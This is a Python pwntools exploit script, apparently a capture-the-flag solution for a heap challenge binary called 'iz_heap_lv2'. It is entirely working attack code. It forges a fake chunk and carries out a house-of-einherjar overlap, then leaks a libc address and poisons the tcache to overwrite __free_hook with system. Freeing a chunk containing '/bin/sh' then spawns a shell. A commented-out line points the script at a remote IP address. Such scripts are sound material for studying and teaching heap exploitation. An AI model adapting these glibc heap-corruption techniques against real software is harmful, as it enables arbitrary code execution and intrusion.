from pwn import *


binpath = './iz_heap_lv2'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
b *0x400d38

ignore 1 18

set $table=0x602040
set $sizes=0x6020E0
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
# io = remote('localhost', 4088)
# io = remote('165.22.110.249', 4444)


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, data):
    io.recvuntil('Choice:')
    io.sendline('1')

    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('data:')
    io.send((data + '\n')[:size])


@debug
def edit(index, data):
    io.recvuntil('Choice:')
    io.sendline('2')

    io.recvuntil('index: ')
    io.sendline(str(index))
    io.recvuntil('data: ')
    io.send(data + '\n')

    io.recvuntil('Success!\n')


@debug
def delete(index):
    io.recvuntil('Choice:')
    io.sendline('3')

    io.recvuntil('index: ')
    io.sendline(str(index))


@debug
def show(index):
    io.recvuntil('Choice:')
    io.sendline('4')
    io.recvuntil('index: ')
    io.sendline(str(index))

    io.recvuntil('Data: ')
    data = io.recvuntil('1.')[:-2]
    return data


addr_table = 0x602040
target_size = 0xf8  # chunk_size == 0x160
add(0x27, 'consolidate target')  # 0
add(0x28, 'overlap target')  # 1
add(target_size, 'einherjar target')  # 2
add(0x38, 'prevent top consolidate')  # 3

for i in xrange(4, 4 + 7):
    add(target_size, str(i))
for i in xrange(4, 4 + 7):
    delete(i)

# fake malloc header at chunk 0
payload = ''
payload += p64(0xdeadbeaf)  # user content (prev_size)
payload += p64(0x50 | 1)  # size
payload += p64(addr_table - 0x18)  # fd
payload += p64(addr_table - 0x10)  # bk
edit(0, payload)

# 
prev_size = 0x50
payload = ''
payload += 'B' * 0x20
payload += p64(prev_size)
# edit chunk 1 to clear prev_in_use
# sending maximum size will overwrite PREV_IN_USE to NULL
edit(1, payload)

# trigger house of einherjar
delete(2)

# free overlapping target chunk
delete(1)

add(0xff, 'hogehoge')
data = show(1).rstrip()

addr_libc = u64(data[8:].ljust(8, '\x00')) - 0x3ebd0a
print "addr_libc = {:x}".format(addr_libc)

# overwrite overlapping chunk's tcache next
payload = ''
payload += '/bin/sh\x00'
payload += 'A' * 0x10
payload += p64(0x31)
payload += p64(addr_libc + libc.symbols['__free_hook'])  # next
edit(1, payload)

add(0x28, 'consume')

add(0x28, p64(addr_libc + libc.symbols['system']))
delete(1)

io.interactive()
